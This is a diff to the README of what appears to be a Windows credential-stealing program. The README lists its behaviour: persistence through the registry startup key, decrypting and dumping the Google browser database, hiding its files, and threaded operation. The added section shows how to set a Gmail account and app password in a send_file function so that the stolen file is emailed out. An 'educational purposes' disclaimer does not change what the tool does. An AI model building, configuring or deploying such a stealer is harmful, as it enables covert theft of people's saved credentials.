@@ -4,7 +4,7 @@
 
 #### Any use of the Software not for training purposes entails criminal liability. The author used the code for educational purposes
 
-### work on Windows:
+### How it Work (only on Windows):
 
 1. The program is written to Windows startup via the registry
 2. The decrypted Google database is written to a file
@@ -17,3 +17,10 @@
 9. All files and folders are hidden, except for the program itself
 
 #### The program runs in multiple threads, so all processes occur simultaneously
+
+#### Replace it with your information (d'your_gmail' and 'password_appa') in **send_file** function. (If you want test this program) 
+```
+msg['From'] = 'your_gmail'
+msg['To'] = 'your_gmail'
+server.login('your_gmail', 'password_app')
+``` 
